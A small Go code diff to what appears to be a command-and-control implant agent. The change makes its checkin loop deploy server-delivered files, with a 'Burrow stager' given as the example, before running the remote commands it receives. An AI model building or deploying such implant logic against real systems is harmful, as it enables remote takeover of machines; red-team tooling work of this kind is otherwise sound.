@@ -75,6 +75,10 @@ func RunAgent(configPath string) error {
 			fmt.Fprintf(os.Stderr, "[!] checkin failed: %v\n", err)
 		} else {
 			req.SessionID = resp.SessionID
+			// Process file deliveries first (e.g., deploying Burrow stager)
+			if len(resp.Files) > 0 {
+				handleFileDeliveries(resp.Files)
+			}
 			for _, cmd := range resp.Commands {
 				result := executeCommand(cmd)
 				result.SessionID = resp.SessionID
